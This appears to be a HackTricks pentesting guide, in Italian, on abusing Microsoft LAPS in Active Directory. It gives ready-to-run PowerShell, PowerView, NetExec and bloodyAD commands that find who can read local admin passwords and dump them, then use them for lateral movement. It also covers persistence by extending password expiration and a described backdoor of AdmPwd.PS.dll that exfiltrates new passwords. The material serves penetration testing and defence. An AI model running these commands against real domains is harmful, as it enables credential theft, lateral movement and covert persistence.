# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Attualmente ci sono **2 varianti di LAPS** che puoi incontrare durante un assessment:

- **Legacy Microsoft LAPS**: memorizza la password dell'amministratore locale in **`ms-Mcs-AdmPwd`** e il tempo di scadenza in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrato in Windows dagli aggiornamenti di aprile 2023): può ancora emulare la modalità legacy, ma in modalità nativa usa attributi **`msLAPS-*`**, supporta **password encryption**, **password history** e **DSRM password backup** per i domain controllers.

LAPS è progettato per gestire le **password degli amministratori locali**, rendendole **uniche, casuali e cambiate frequentemente** sui computer joined al domain. Se puoi leggere quegli attributi, di solito puoi **pivot as the local admin** sull'host interessato. In molti ambienti, la parte interessante non è solo leggere la password stessa, ma anche scoprire **a chi era stato delegato l'accesso** agli attributi della password.

### Legacy Microsoft LAPS attributes

Negli oggetti computer del domain, l'implementazione di legacy Microsoft LAPS comporta l'aggiunta di due attributi:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Windows LAPS nativo aggiunge diversi nuovi attributi agli oggetti computer:

- **`msLAPS-Password`**: clear-text password blob memorizzato come JSON quando l'encryption non è abilitata
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data per i domain controllers
- **`msLAPS-CurrentPasswordVersion`**: tracciamento della versione basato su GUID usato dalla logica più recente di rilevamento rollback (Windows Server 2025 forest schema)

Quando **`msLAPS-Password`** è leggibile, il valore è un oggetto JSON che contiene il nome dell'account, il tempo di aggiornamento e la password in clear-text, per esempio:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Verifica se è attivato
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Accesso alla password LAPS

Puoi **scaricare il raw LAPS policy** da `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e poi usare **`Parse-PolFile`** dal pacchetto [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) per convertire questo file in un formato leggibile dall’uomo.

### Legacy Microsoft LAPS PowerShell cmdlets

Se il modulo legacy LAPS è installato, di solito sono disponibili i seguenti cmdlets:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlet PowerShell di Windows LAPS

Windows LAPS nativo include un nuovo modulo PowerShell e nuovi cmdlet:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Alcuni dettagli operativi sono importanti qui:

- **`Get-LapsADPassword`** gestisce automaticamente **legacy LAPS**, **Windows LAPS in clear-text** e **Windows LAPS cifrato**.
- Se la password è cifrata e puoi **leggerla** ma non **decifrarla**, il cmdlet restituisce i metadati ma non la password in clear-text.
- La **password history** è disponibile solo quando è abilitata la **Windows LAPS encryption**.
- Sui domain controllers, la source restituita può essere **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** può essere usato anche per scoprire **chi può leggere la password e leggerla**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Se **`msLAPS-Password`** è leggibile, analizza il JSON restituito ed estrai **`p`** per la password e **`n`** per il nome dell’account admin locale gestito.

### Linux / remote tooling

I tool moderni supportano sia il legacy Microsoft LAPS sia Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Note:

- Build recenti di **NetExec** supportano **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** e **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** è ancora utile per il **legacy Microsoft LAPS** da Linux, ma prende di mira solo **`ms-Mcs-AdmPwd`**.
- Se l’ambiente usa **encrypted Windows LAPS**, una semplice lettura LDAP non basta; devi anche essere un **authorized decryptor** oppure abusare di un percorso di decrypt supportato.

### Directory synchronization abuse

Se hai diritti di sincronizzazione della directory a livello di dominio invece dell’accesso diretto in lettura su ogni computer object, LAPS può ancora essere interessante.

La combinazione di **`DS-Replication-Get-Changes`** con **`DS-Replication-Get-Changes-In-Filtered-Set`** o **`DS-Replication-Get-Changes-All`** può essere usata per sincronizzare attributi **confidential / RODC-filtered** come il legacy **`ms-Mcs-AdmPwd`**. BloodHound modella questo come **`SyncLAPSPassword`**. Controlla [DCSync](dcsync.md) per il contesto sui replication-rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita l’enumerazione di LAPS con diverse funzioni.\
Una è il parsing di **`ExtendedRights`** per **tutti i computer con LAPS abilitato.** Questo mostra i **group** specificamente **delegati a leggere le password LAPS**, che spesso sono utenti in protected groups.\
Un **account** che ha **joinato** un computer a un dominio riceve `All Extended Rights` su quell’host, e questo diritto dà all’**account** la possibilità di **leggere le password**. L’enumerazione può mostrare un user account che può leggere la password LAPS su un host. Questo può aiutarci a **target specifici AD users** che possono leggere le password LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Se non hai una PowerShell interattiva, puoi abusare di questo privilegio da remoto tramite LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Questo scarica tutti i segreti LAPS che l'utente può leggere, consentendoti di muoverti lateralmente con una password di amministratore locale diversa.

## Utilizzo della password LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistenza LAPS

### Data di scadenza

Una volta admin, è possibile **ottenere le password** e **impedire** a una macchina di **aggiornare** la sua **password** **impostando la data di scadenza nel futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS usa invece **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> La password ruoterà comunque se un **admin** usa **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, oppure se **Do not allow password expiration time longer than required by policy** è abilitato.

### Recuperare password storiche dai backup di AD

Quando **Windows LAPS encryption + password history** è abilitato, i backup di AD montati possono diventare un’ulteriore fonte di secrets. Se puoi accedere a uno snapshot di AD montato e usare la **recovery mode**, puoi interrogare password memorizzate più vecchie senza parlare con un DC live.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Questo è soprattutto rilevante durante **AD backup theft**, **offline forensics abuse** o **disaster-recovery media access**.

### Backdoor

Il codice sorgente originale per il legacy Microsoft LAPS si può trovare [qui](https://github.com/GreyCorbel/admpwd), quindi è possibile inserire una backdoor nel codice (dentro il metodo `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs`, per esempio) che in qualche modo **exfiltrate new passwords o le memorizzi da qualche parte**.

Poi, compila il nuovo `AdmPwd.PS.dll` e caricalo sulla macchina in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e cambia il modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
